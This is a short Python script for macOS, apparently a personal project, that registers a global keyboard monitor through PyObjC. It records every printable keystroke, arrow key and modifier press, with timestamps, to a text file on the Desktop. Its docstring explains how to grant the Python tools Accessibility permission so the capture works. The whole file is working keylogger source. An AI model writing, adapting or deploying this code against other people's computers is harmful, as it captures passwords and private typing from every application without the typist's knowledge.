#!/usr/bin/python2.6

'''

IMPORTANT

Since System Preferences is stupid, you must add IDLE for this version
back into the allowed security thingy. You know what to do.

For those who don't if this code somehow becomes famous, go to
System Preferences, Security & Privacy, Privacy, Accessibility,
then add basically all of the apps in your Python folder. I added
IDLE, Python Launcher, and Build Applet. Im not sure which are
required since I am lazy, just do it. Also everytime you run it,
IDLE will get unchecked from the pane so you will have to check it
again. Although it might just be me. Who knows.


'''

from Cocoa import *
from Foundation import *
from PyObjCTools import AppHelper
import keycode
import string
import sys
import time

class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, aNotification):
        NSEvent.addGlobalMonitorForEventsMatchingMask_handler_(NSKeyDownMask, handler)

def handler(event):
    flags = event.modifierFlags()
    modifiers = []
    arrows = []

    try:
        s = event.charactersIgnoringModifiers()
        arrowPressed = False
        if s == NSUpArrowFunctionKey:
            arrows.append("</UP>")
            arrowPressed = True
        if s == NSDownArrowFunctionKey:
            arrows.append("</DOWN>")
            arrowPressed = True
        if s == NSLeftArrowFunctionKey:
            arrows.append("</LEFT>")
            arrowPressed = True
        if s == NSRightArrowFunctionKey:
            arrows.append("</RIGHT>")
            arrowPressed = True

        if flags & NSShiftKeyMask:
            modifiers.append("</SHIFT>")
        if flags & NSControlKeyMask:
            modifiers.append("</CONTROL>")
        if flags & NSAlternateKeyMask:
            modifiers.append("</ALTERNATE>")
        if flags & NSCommandKeyMask:
            modifiers.append("</COMMAND>")
        if flags & NSFunctionKeyMask and not arrowPressed:
            modifiers.append("</FUNCTION>")
        if flags & NSAlphaShiftKeyMask:
            modifiers.append("</ALPHASHIFT>")
    except:
        print("Something happened")

    log = open("/Users/aturley/Desktop/logs.txt", 'a')
    
    for key in arrows:
        log.write(key)
        log.write(' PTO ')
        log.write(time.strftime("%Y %m %d %H %M %S"))
        log.write('\n')

    for key in modifiers:
        log.write(key)
        log.write(' PTO ')
        log.write(time.strftime("%Y %m %d %H %M %S"))
        log.write('\n')
    
    if event.type() == NSKeyDown and keycode.tostring(event.keyCode()) in string.printable:
        print(event.charactersIgnoringModifiers())
        log.write(event.charactersIgnoringModifiers())
        log.write(' PTO ')
        log.write(time.strftime("%Y %m %d %H %M %S"))
        log.write('\n')

    log.close()
    
def main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()
    
main()
